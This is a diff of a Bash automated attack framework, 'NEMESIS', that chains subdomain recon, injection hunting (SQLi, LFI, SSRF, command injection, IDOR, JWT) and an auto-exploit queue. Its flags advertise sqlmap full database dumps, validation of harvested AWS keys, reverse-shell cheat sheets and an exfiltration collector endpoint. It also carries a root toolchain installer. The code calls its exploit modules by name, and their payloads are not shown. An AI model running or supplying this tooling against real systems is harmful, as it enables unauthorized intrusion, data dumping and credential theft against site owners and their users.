-  if has subfinder; then subfinder -d "$DOMAIN" -silent ${COOKIE:+--cookie "$COOKIE"} 2>/dev/null >> "$W/subs/all.txt" || true; fi
-  if has amass; then timeout 300 amass enum -passive -d "$DOMAIN" 2>/dev/null >> "$W/subs/all.txt" || true; fi
-  if has assetfinder; then assetfinder --subs-only "$DOMAIN" 2>/dev/null >> "$W/subs/all.txt" || true; fi
-  echo "$DOMAIN" >> "$W/subs/all.txt"
-  [[ -f "$SCOPE_FILE" ]] && cat "$SCOPE_FILE" >> "$W/subs/all.txt"
-  u "$W/subs/all.txt"
-  log OK "subdomains: $(cnt "$W/subs/all.txt")"
+    # export helper PATHs for tools installed to ~/go/bin
+    export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin:$HOME/.local/bin"
 
-  step "02 RESOLVE — httpx alive + status"
-  if has httpx; then
-    httpx -l "$W/subs/all.txt" -silent -status-code -title -tech-detect -follow-redirects \
-      -timeout "$T_HTTPX" -threads 50 -o "$W/subs/live.txt" 2>/dev/null || true
-    awk '{print $1}' "$W/subs/live.txt" | sort -u > "$W/subs/live_hosts.txt"
-    grep "\[200\]" "$W/subs/live.txt" | awk '{print $1}' | sort -u > "$W/subs/status_200.txt"
-    grep -oE '\[[0-9]{3}\]' "$W/subs/live.txt" | tr -d '[]' | sort | uniq -c | sort -rn | head -5 >> "$LOG"
-  else
-    log W "httpx missing — using curl fallback"
-    while IFS= read -r sub; do
-      for proto in https http; do
-        probe "${proto}://${sub}"
-        [[ "$RC" =~ ^(200|301|302|401|403)$ ]] && { echo "${proto}://${sub} [${RC}]" >> "$W/subs/live.txt"; break; }
-      done
-    done < "$W/subs/all.txt"
-  fi
-  u "$W/subs/live.txt"; u "$W/subs/status_200.txt"
-  log OK "alive: $(cnt "$W/subs/live.txt")"
+    print_banner
 
-  stage_urls
-  stage_js_paths
-  stage_fuzz
-  stage_nuclei
-  stage_waf
-  stage_calibrate
+    # Preflight: required binaries (warn once, continue)
+    local REQUIRED=(curl jq python3 subfinder httpx nuclei katana ffuf gf waybackurls gau dnsx)
+    local missing=0
+    for bin in "${REQUIRED[@]}"; do
+        has "$bin" || { log_warn "Missing tool: $bin (run: bug --install)"; missing=1; }
+    done
+    [[ "$missing" -eq 1 ]] && echo ""
 
-  step "WEB — fingerprints + verified injection hunting"
-  stage_web
-  mod_sqli_verify
-  mod_lfi_ssrf_cmdi_ssti
-  mod_idor_bac
-  mod_csrf_cors_redirect
-  mod_jwt_verify
-  mod_takeover
+    if [[ "$M_SCOPE" == true ]]; then
+        run_scope_scan
+        exit 0
+    fi
 
-  stage_cloud
-  stage_api
-  stage_param_fuzz
+    # Select mode
+    if [[ "$M_SUB" == true ]]; then
+        run_single_mode "sub"
+    elif [[ "$M_ONE" == true ]]; then
+        run_single_mode "one"
+    elif [[ "$M_URL" == true ]]; then
+        run_single_mode "url"
+    elif [[ "$M_WE" == true ]]; then
+        run_single_mode "we"
+    elif [[ "$M_JS" == true ]]; then
+        run_single_mode "js"
+    elif [[ "$M_FUZZ" == true ]]; then
+        run_single_mode "fuzz"
+    elif [[ "$M_PORTS" == true ]]; then
+        run_single_mode "ports"
+    elif [[ "$M_VULN" == true ]]; then
+        run_single_mode "vuln"
+    elif [[ "$M_EXPLOIT" == true ]]; then
+        run_single_mode "exploit"
+    elif [[ "$M_NUCLEI_ONLY" == true ]]; then
+        run_single_mode "nuclei"
+    elif [[ "$M_XSS" == true ]]; then
+        run_single_mode "xss"
+    elif [[ "$M_SQLI" == true ]]; then
+        run_single_mode "sqli"
+    elif [[ "$M_SSRF" == true ]]; then
+        run_single_mode "ssrf"
+    elif [[ "$M_LFI" == true ]]; then
+        run_single_mode "lfi"
+    elif [[ "$M_CSRF" == true ]]; then
+        run_single_mode "csrf"
+    elif [[ "$M_CORS" == true ]]; then
+        run_single_mode "cors"
+    elif [[ "$M_IDOR" == true ]]; then
+        run_single_mode "idor"
+    elif [[ "$M_OAUTH" == true ]]; then
+        run_single_mode "oauth"
+    elif [[ "$M_TECH" == true ]]; then
+        run_single_mode "tech"
+    elif [[ "$M_WAF" == true ]]; then
+        run_single_mode "waf"
+    elif [[ "$M_API" == true ]]; then
+        run_single_mode "api"
+    elif [[ "$M_PMF" == true ]]; then
+        run_single_mode "pmf"
+    elif [[ "$M_REPORT" == true ]]; then
+        run_single_mode "report"
+    else
+        run_full_scan
+    fi
 
-  if has gowitness; then
-    step "SCREENSHOTS — gowitness"
-    gowitness scan file -f "$W/subs/live_hosts.txt" --screenshot-path "$W/screenshots" --threads 8 --timeout 12 --db-path "$W/screenshots/gowitness.sqlite3" >/dev/null 2>&1 || true
-  fi
-
-  if [[ "$F_VERIFY_ONLY" == true ]]; then
-    step "VERIFY-ONLY — exploit queue held"
-    log W "--verify-only: $(qcount total) findings verified; exploit queue NOT executed"
-    log S "queue preview:"
-    for row in "${EXPLOITS[@]+"${EXPLOITS[@]}"}"; do echo -e "  ${G}→${N} $row" >> "$LOG"; done
-    for row in "${EXPLOITS[@]+"${EXPLOITS[@]}"}"; do log H "$row"; done
-  else
-    run_exploits
-  fi
-  gen_report
-}
-
-# ─────────────────────────── MODE DISPATCH ───────────────────────────
-usage() { cat <<'USG'
-BUG FRAMEWORK NEMESIS v6.1 — NOISE-ZERO (authorized targets only)
-
-USAGE:
-  bug <domain> [flags]            full pipeline
-  bug <domain> --mode <m>         single module
-  bug --install                   install toolchain + this binary
-
-MODES (-m): sub one url web js fuzz ports vuln nuclei xss sqli ssrf lfi csrf cors idor oauth tech waf api pmf report scope
-FLAGS:
-  -d <file>       scope file (extra subdomains)
-  -c <cookie>     session cookie
-  -p <proxy>      proxy (http://127.0.0.1:8080)
-  -H <header>     extra header (repeatable)
-  --deep          aggressive: full ffuf wordlist + sqlmap --dump
-  --quick         recon + nuclei only, no exploit
-  --parallel      run nuclei/ffuf concurrently
-  --strict        medium findings go to findings.txt
-  --verify-only   verify + queue exploits, do not execute
-  --verify-keys   validate harvested AWS keys with sts
-  --shell         write reverse-shell cheat sheet on CMDi hit
-  --collector <u> xss/ssrf exfil endpoint
-  --headless      run with zero interactive output
-  --rate <n>      max requests/sec
-  --dump          sqlmap full dump (alias of --deep)
-  --no-exploit    recon/verify only
-  --resume        skip stages with existing output
-  --debug         verbose logging
-  -v              version
-USG
+    exit 0
 }
 
-install_toolchain() {
-  echo "[*] NEMESIS installer — Kali/Debian toolchain"
-  [[ $EUID -eq 0 ]] || { echo "[!] run as root: sudo bug --install"; exit 1; }
-  apt-get update -qq
-  apt-get install -y -qq curl jq git python3-pip dnsutils netcat-openbsd 2>/dev/null
-  GO_BIN=/usr/local/go/bin/go; [[ -x "$GO_BIN" ]] || GO_BIN=$(command -v go || true)
-  if [[ -z "$GO_BIN" ]]; then
-    echo "[*] installing go…"; wget -qO /tmp/go.tgz https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
-    tar -C /usr/local -xzf /tmp/go.tgz; GO_BIN=/usr/local/go/bin/go
-  fi
-  export PATH=$PATH:/root/go/bin:$(go env GOPATH 2>/dev/null)/bin
-  for t in subfinder httpx nuclei katana dalfox ffuf gau waybackurls assetfinder gowitness; do
-    command -v "$t" >/dev/null 2>&1 || GO_INSTALL=1
-  done
-  [[ "${GO_INSTALL:-0}" == "1" ]] && {
-    "$GO_BIN" install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
-    "$GO_BIN" install github.com/projectdiscovery/httpx/cmd/httpx@latest
-    "$GO_BIN" install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-    "$GO_BIN" install github.com/projectdiscovery/katana/cmd/katana@latest
-    "$GO_BIN" install github.com/hahwul/dalfox/v2@latest
-    "$GO_BIN" install github.com/ffuf/ffuf/v2@latest
-    "$GO_BIN" install github.com/lc/gau/v2/cmd/gau@latest
-    "$GO_BIN" install github.com/tomnomnom/waybackurls@latest
-    "$GO_BIN" install github.com/tomnomnom/assetfinder@latest
-    "$GO_BIN" install github.com/sensepost/gowitness@latest
-  }
-  command -v sqlmap >/dev/null 2>&1 || apt-get install -y -qq sqlmap 2>/dev/null || pip3 install -q sqlmap 2>/dev/null || true
-  command -v wafw00f >/dev/null 2>&1 || pip3 install -q wafw00f 2>/dev/null || true
-  command -v whatweb >/dev/null 2>&1 || apt-get install -y -qq whatweb 2>/dev/null || true
-  command -v amass >/dev/null 2>&1 || apt-get install -y -qq amass 2>/dev/null || true
-  [[ -d /usr/share/seclists ]] || { echo "[*] cloning seclists…"; git clone -q --depth 1 https://github.com/danielmiessler/SecLists /usr/share/seclists; }
-  nuclei -update-templates -silent 2>/dev/null || true
-  echo "[✔] toolchain ready. Re-login or: export PATH=\$PATH:/root/go/bin"
-}
-
-# ─────────────────────────── EMBEDDED PYTHON HELPERS ───────────────────────────
-write_helpers() {
-  mkdir -p "$W/.py"
-  # helper 1: js_paths (paths only — no scheme/host)
-  cat > "$W/.py/js_paths.py" <<'JSP'
-import os,re,sys
-PATHS=set()
-for f in sys.argv[1:]:
-    if not os.path.isfile(f): continue
-    try: s=open(f,encoding="utf-8",errors="ignore").read()
-    except: continue
-    for m in re.finditer(r'["\'](/[^"\']{2,250})["\']',s):
-        p=m.group(1)
-        if p.startswith("//"): continue
-        if re.search(r'\.(png|jpe?g|gif|svg|ico|css|woff2?|ttf|eot|map|mp[34]|webm|zip|gz|pdf|min\.js)$',p,re.I): continue
-        if re.search(r'(node_modules|webpack|polyfill|vendor|bootstrap|jquery|analytics)',p,re.I): continue
-        p=p.split("?")[0].split("#")[0]
-        if len(p)>=3 and p not in ("/","//"): PATHS.add(p)
-for p in sorted(PATHS): print(p)
-JSP
-  # helper 2: active filter (strip CDN/unreachable hosts)
-  cat > "$W/.py/active.py" <<'ACTP'
-import socket,sys
-for line in sys.stdin:
-    h=line.strip().split("/")[2] if "//" in line else line.strip()
-    if not h: continue
-    try: socket.getaddrinfo(h,443,proto=socket.IPPROTO_TCP); print(line.strip())
-    except: pass
-ACTP
-  # helper 3: form scrape (extract action+inputs for CSRF/fuzz)
-  cat > "$W/.py/form_scrape.py" <<'FSP'
-import re,sys,urllib.request
-for u in sys.argv[1:]:
-    try: h=urllib.request.urlopen(u,timeout=8); s=h.read().decode("utf-8","ignore")
-    except: continue
-    for m in re.finditer(r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>(.*?)</form>',s,re.S|re.I):
-        a=m.group(1); ins=re.findall(r'<input[^>]*name=["\']([^"\']+)["\']',m.group(2),re.I)
-        print(f"{u}|{a}|{','.join(ins)}")
-FSP
-  # helper 4: js downloader
-  cat > "$W/.py/js_dl.py" <<'JDL'
-import os,sys,urllib.request
-for u in sys.argv[1:]:
-    try:
-        d=urllib.request.urlopen(u,timeout=10).read()
-        f=os.path.join(sys.argv[0].rsplit("/",1)[0],"raw",u.split("/")[-1][:80].replace("?","_"))
-        open(f,"wb").write(d); print(f)
-    except: pass
-JDL
-  chmod +x "$W/.py/"*.py
-}
-
-# ─────────────────────────── ARGS ───────────────────────────
-MODE=""; MODES=()
-while [[ $# -gt 0 ]]; do
-  case "$1" in
-    --install) F_INSTALL=true ;;
-    --deep|--dump) F_DEEP=true; EXP_DUMP=true ;;
-    --quick) F_QUICK=true ;;
-    --parallel) F_PARALLEL=true ;;
-    --verify-only) F_VERIFY_ONLY=true ;;
-    --verify-keys) F_VERIFY_KEYS=true ;;
-    --shell) F_SHELL=true ;;
-    --collector) COLLECTOR="$2"; shift ;;
-    --headless) F_SILENT=true; F_BANNER=false ;;
-    --rate) RATE="$2"; shift ;;
-    --no-exploit) F_NO_EXPLOIT=true ;;
-    --resume) F_RESUME=true ;;
-    --debug) F_DEBUG=true ;;
-    --strict) F_STRICT=true ;;
-    -d) SCOPE_FILE="$2"; shift ;;
-    -c) COOKIE="$2"; shift ;;
-    -p) PROXY="$2"; shift ;;
-    -H) HDRS+=("$2"); shift ;;
-    -m|--mode) MODE="$2"; shift ;;
-    -v|--version) echo "NEMESIS v$VERSION"; exit 0 ;;
-    -h|--help) usage; exit 0 ;;
-    -*) log E "unknown flag: $1"; usage; exit 1 ;;
-    *) [[ -z "$DOMAIN" ]] && DOMAIN="$1" || DOMAIN="$DOMAIN $1" ;;
-  esac
-  shift
-done
-[[ -z "$DOMAIN" && "$F_INSTALL" != true ]] && { usage; exit 1; }
-[[ -n "$MODE" ]] && { MODES=("$MODE"); G_FULL=false; } || G_FULL=true
-
-if [[ "$F_INSTALL" == true ]]; then install_toolchain; exit 0; fi
-for d in $DOMAIN; do :; done
-DOMAIN=$(echo "$DOMAIN" | tr ' ' '\n' | head -1)
-W="$WS_BASE/$DOMAIN"; EX="$W/exploits"; LOG="$W/master.log"
-mkdir -p "$W" "$EX"; write_helpers
-[[ "$F_BANNER" == true ]] && {
-  echo -e "${M}┌──────────────────────────────────────────┐"
-  echo -e "│  ${W2}NEMESIS v$VERSION${M} — ${C}${NAME}${M}          │"
-  echo -e "│  ${D}NOISE-ZERO · auto-verify · auto-exploit${M} │"
-  echo -e "└──────────────────────────────────────────┘${N}"
-  echo -e "${D}target:${N} ${G}$DOMAIN${N}  workspace: ${G}$W${N}"
-}
-
-# ─────────────────────────── MODE ROUTER ───────────────────────────
-case "$MODE" in
-  sub)    : > "$W/subs/all.txt"
-          subfinder -d "$DOMAIN" -silent 2>/dev/null >> "$W/subs/all.txt" || true
-          assetfinder --subs-only "$DOMAIN" 2>/dev/null >> "$W/subs/all.txt" || true
-          echo "$DOMAIN" >> "$W/subs/all.txt"; u "$W/subs/all.txt"
-          log OK "subs: $(cnt "$W/subs/all.txt") → $W/subs/all.txt" ;;
-  one)    probe "https://$DOMAIN"; echo -e "code=${RC} len=${RL}"; echo "$RB" | head -30 ;;
-  url)    stage_urls ;;
-  web)    stage_web; mod_sqli_verify; mod_lfi_ssrf_cmdi_ssti; mod_idor_bac; mod_csrf_cors_redirect; mod_jwt_verify; mod_takeover ;;
-  js)     stage_js_paths ;;
-  fuzz)   stage_fuzz ;;
-  ports)  has nmap && nmap -Pn -sV -T4 --top-ports 1000 "$DOMAIN" -oN "$W/ports.txt" 2>/dev/null | tail -20 || log W "nmap missing" ;;
-  vuln|nuclei) stage_nuclei ;;
-  xss)    stage_web ;;
-  sqli)   mod_sqli_verify ;;
-  ssrf)   mod_lfi_ssrf_cmdi_ssti ;;
-  lfi)    mod_lfi_ssrf_cmdi_ssti ;;
-  csrf)   mod_csrf_cors_redirect ;;
-  cors)   mod_csrf_cors_redirect ;;
-  idor)   mod_idor_bac ;;
-  oauth)  mod_jwt_verify ;;
-  tech)   stage_web ;;
-  waf)    stage_waf ;;
-  api)    stage_api ;;
-  pmf)    stage_param_fuzz ;;
-  report) gen_report ;;
-  scope)  cat "$W/subs/live.txt" 2>/dev/null | sed 's|^https\?://||;s|/.*||' | sort -u ;;
-  *)      run_pipeline ;;
-esac
-
-if [[ "$F_VERIFY_ONLY" == true && "$MODE" != "report" ]]; then
-  log S "QUEUE (held — use without --verify-only to execute):"
-  for row in "${EXPLOITS[@]+"${EXPLOITS[@]}"}"; do log H "$row"; done
-fi
-[[ "$F_SILENT" == false && -z "$MODE" ]] && echo -e "${G}Done in $(( ($(date +%s)-START)/60 ))m → ${W}${N}"
-exit 0
-NEMESIS_EOF
-
-chmod +x /usr/local/bin/bug
-echo "✔ NEMESIS v6.1 assembled: $(wc -l < /usr/local/bin/bug) lines — run: bug example.com"
+main "$@"
